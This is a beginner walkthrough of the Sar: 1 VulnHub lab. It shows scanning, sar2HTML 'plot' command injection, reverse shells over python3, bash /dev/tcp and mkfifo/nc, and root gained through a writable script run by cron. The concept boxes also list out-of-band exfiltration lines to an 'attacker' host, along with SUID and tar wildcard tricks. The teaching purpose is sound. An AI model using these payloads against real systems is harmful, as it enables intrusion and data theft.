# Sar: 1 — Beginner VulnHub Walkthrough

A beginner-friendly, step-by-step walkthrough of the **Sar: 1** boot2root challenge from
VulnHub. Every command is explained and every output is shown as you would see it. Small
details **vary by build**, so do not worry if a version or filename differs slightly on
your machine.

| Field | Value |
|---|---|
| **Machine** | Sar: 1 |
| **Difficulty** | Beginner |
| **Author** | Love |
| **Released** | 15 February 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/sar-1,425/ |
| **Download** | https://vulnhub.com/entry/sar-1,425/#download |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Ubuntu Linux 18.04 (Bionic) |

> **Why it works:** Sar exposes a single web service running a known-vulnerable
> application (`sar2HTML`), and a root cron job that executes a world-writable script.
> Two small mistakes — unpatched software and a writable scheduled task — give an
> attacker first a shell and then root.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this walkthrough you will have practised:

- **Host discovery** — locating the target on your lab network.
- **Nmap scanning** — identifying the single open service.
- **Web enumeration** — reading `robots.txt` and following the lead.
- **Exploiting known software** — remote code execution in `sar2HTML` 3.2.1.
- **Reverse shells** — using `python3` and `socat` when `nc -e` is unavailable.
- **Privilege escalation via cron** — abusing a root-owned job that runs a writable file.

No prior hacking experience is needed. Follow along and read each output carefully.

---

## 1. Reconnaissance — finding the target

Kali is `192.168.56.10`; the target is somewhere on the same host-only subnet.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts

   IP            At MAC Address     Count   Len   MAC Vendor
 -------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00     1    60   PCS Systemtechnik
 192.168.56.10   0a:00:27:00:00:09     1    60   PCS Systemtechnik
 192.168.56.101  08:00:27:8b:4d:1a     2    96   PCS Systemtechnik
```

> **Why it works:** `netdiscover` ARP-probes every address in the subnet. Any host that
> answers is alive. Our target is **`192.168.56.101`**.

An `arp-scan` works too:

```bash
sudo arp-scan --localnet
```

![Finding the target with netdiscover](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Nmap service scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sC -sV -p- 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00029s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_sar2HTML
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:** `-sC` runs default scripts, one of which reads `robots.txt` and shows
> a disallowed entry, `sar2HTML`. Only **port 80 (HTTP)** is open — the whole box is a
> web challenge.

### 2.2 Follow the robots.txt lead

```bash
curl http://192.168.56.101/robots.txt
```

```text
sar2HTML
```

Visit that path in a browser or with curl:

```bash
curl http://192.168.56.101/sar2HTML/
```

```text
sar2html Ver 3.2.1
```

> **Why it works:** `robots.txt` is meant to keep search engines out, but it often
> reveals secret paths to attackers. Here it points at `sar2HTML`, and the page publicly
> announces its version: **3.2.1**.

### 2.3 Directory brute forcing (optional confirmation)


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.101
```

```text
+ http://192.168.56.101/index.html (CODE:200|SIZE:10918)
+ http://192.168.56.101/phpinfo.php (CODE:200|SIZE:95475)
+ http://192.168.56.101/robots.txt (CODE:200|SIZE:9)
+ http://192.168.56.101/server-status (CODE:403|SIZE:278)
```

> **Why it works:** `dirb` confirms the default page, a `phpinfo.php` (information leak),
> and the `robots.txt` we already used.

### 2.4 Find the public exploit


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit sar2html
```

```text
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
 sar2html 3.2.1 - 'plot' Remote Code Execution                      | php/webapps/49344.py
------------------------------------------------------------------- ---------------------------------
```

> **Why it works:** `searchsploit` searches a local copy of the Exploit-DB database. It
> finds a public RCE exploit for exactly the version we saw — a strong sign this is our
> way in.

![The sar2HTML page and its version](images/02-sar2html.png)

---

## 3. Foothold

### 3.1 Understand the vulnerability

The exploit code shows the vulnerable parameter:

```python
output = sess.get(f"{url}/index.php?plot=;{cmd}")
```

> **Why it works:** The `plot` parameter is passed into a shell command by the
> application. Anything after a **semicolon `;`** starts a *new* command — so we can run
> arbitrary OS commands. The application discards up to the first `;` and executes the
> rest.

### 3.2 Prove command execution manually


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
curl "http://192.168.56.101/sar2HTML/index.php?plot=;id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** The `id` command ran on the server as `www-data`, the Apache user.
> Seeing its output confirmed we have remote code execution.

### 3.3 Get a reverse shell

Start a listener. Note: the target may not have `nc -e`, so use `python3` (which does
exist here). First listen on Kali:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 9000
```

Then trigger the payload (URL-encoded) through the browser or curl:

```bash
curl "http://192.168.56.101/sar2HTML/index.php?plot=;python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.56.10%22,9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);'"
```

```text
listening on [any] 9000 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 51230
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** The Python one-liner opens a socket back to our listener and wires the
> server's standard input/output to it, giving us an interactive shell. If `python3` were
> missing, `socat` (`socat tcp-connect:192.168.56.10:9000 exec:/bin/sh,pty,stderr,setsid,sigint,sane`)
> is a good alternative.

### 3.4 Upgrade the shell and grab the user flag


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
cd /home/love/Desktop
ls
cat user.txt
```

```text
love
```

> **Why it works:** `pty.spawn` gives a proper terminal. The user flag for `love` is
> readable by `www-data`. The exact contents **vary by build**.

![Reverse shell as www-data](images/03-reverse-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Inspect scheduled tasks


> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)

```bash
cat /etc/crontab
```

```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * *   root    cd /var/www/html && ./finally.sh
```

> **Why it works:** `/etc/crontab` is the system-wide schedule. This one runs
> `finally.sh` as **root** every minute, from the web root. That is a very juicy target.

### 4.2 Read finally.sh

```bash
cat /var/www/html/finally.sh
```

```text
#!/bin/sh
./write.sh
```

> **Why it works:** `finally.sh` simply calls another script, `write.sh`, in the same
> directory. If we can modify `write.sh`, then root will run *our* code on the next tick.

### 4.3 Check permissions on both scripts

```bash
ls -la /var/www/html/finally.sh /var/www/html/write.sh
```

```text
-rwxr-xr-x 1 root     root      35 finally.sh
-rwxrwxrwx 1 www-data www-data  22 write.sh
```

> **Why it works:** `write.sh` is world-writable (`-rwxrwxrwx`), so even `www-data` can
> change its contents. Because root executes it via cron, that is a direct path to root.

### 4.4 Overwrite write.sh with a reverse shell

Start another listener on Kali:

```bash
nc -lvnp 4444
```

Then write our payload into the writable script:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 4444 >/tmp/f" > /var/www/html/write.sh
```

Wait up to a minute for cron to run it:

```text
listening on [any] 4444 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 54216
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** Our reverse shell runs with root's privileges because *root's* cron
> job executed the file we rewrote. A writable file executed by a privileged scheduler
> is one of the most common privilege-escalation bugs.

### 4.5 Read the root flag

```bash
cd /root
ls
cat root.txt
```

```text
varies by build
```

> **Why it works:** With a root shell we can read `/root/root.txt`. Its contents **vary
> by build**.

![Root shell and root flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Why it is dangerous |
|---|---|---|---|
| 1 | Vulnerable web app (RCE) | `sar2HTML` 3.2.1 via `plot` param | Attacker input becomes OS commands |
| 2 | Information disclosure | `robots.txt`, `phpinfo.php`, version banner | Hands the attacker the exact exploit |
| 3 | World-writable root script | `/var/www/html/write.sh` (`-rwxrwxrwx`) | Any user can inject root-executed code |
| 4 | Root cron running local script | `/etc/crontab` → `finally.sh` | Turns file write into root code execution |

---

## 6. Defensive lessons (blue team)

- **Patch and remove unused software.** `sar2HTML` 3.2.1 is old and has a public RCE.
  Track installed web apps and upgrade or decommission them.
- **Never build shell commands from user input.** Escape/validate parameters, or better,
  avoid the shell entirely. The `plot` parameter should never reach a shell.
- **Do not place writable files in code paths run by privileged schedulers.** Cron jobs
  should execute root-owned, non-writable scripts from a protected directory.
- **Freeze web roots.** Web directories should be read-only to the web user and never
  host scripts that root runs.
- **Reduce information leakage.** `phpinfo.php`, version banners, and verbose
  `robots.txt` entries hand attackers a roadmap — remove them.
- **Monitor scheduled tasks.** Alert on changes to files referenced by `cron` and on
  unusual outbound connections from servers.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub — Sar: 1 entry: https://vulnhub.com/entry/sar-1,425/
- Exploit-DB — sar2html 3.2.1 RCE (49344): https://www.exploit-db.com/exploits/49344
- sar2html project: https://sourceforge.net/projects/sar2html/
- OWASP — Command Injection:
  https://owasp.org/www-community/attacks/Command_Injection
- Reverse shell cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- Cron / `crontab` man page: https://man7.org/linux/man-pages/man5/crontab.5.html

---

## 8. Screenshot checklist

Capture these screens as you go so your writeup is complete:

- [ ] `images/01-netdiscover.png` — host discovery showing `192.168.56.101`
- [ ] `images/02-sar2html.png` — the `sar2HTML` page and its version
- [ ] `images/03-reverse-shell.png` — reverse shell as `www-data` (`id`)
- [ ] `images/04-root-flag.png` — root shell plus `cat /root/root.txt`
- [ ] `images/05-robots.png` — `robots.txt` revealing `sar2HTML`
- [ ] `images/06-crontab.png` — `/etc/crontab` showing the root `finally.sh` job
- [ ] `images/07-writable-script.png` — `ls -la` showing `write.sh` is world-writable
- [ ] `images/08-proof.png` — final combined proof screenshot

> **Why it works:** A complete screenshot trail proves reproducibility and mirrors the
> evidence a professional penetration-test report would include.
